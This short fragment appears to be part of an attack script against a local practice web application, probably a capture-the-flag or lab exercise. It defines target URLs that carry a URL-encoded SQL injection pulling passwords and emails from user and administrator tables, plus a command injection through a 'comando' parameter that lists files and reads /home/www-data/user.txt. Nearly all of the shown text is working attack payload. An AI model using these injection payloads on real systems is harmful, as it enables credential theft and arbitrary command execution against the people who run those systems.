...
fetch_url="http://localhost/web/www/html/final/ulio-html/listadoFotosRovers.php?rover_id=%27e%27%20UNION%20SELECT%20fa.contrasena,%20fa.gmail,%201,%202,%203%20FROM%20final_usuarios%20fa,%20final_administradores%20f%20WHERE%20f.usuario_id%20=%20fa.id"
...
login_url="http://localhost/web/www/html/final/loginConMod/login.php"
...
files_url_usuario="http://localhost/web/www/html/final/dashmin/list_uploads.php?comando=ls%20uploads;cd;cd%20..;%20cat%20/home/www-data/user.txt"
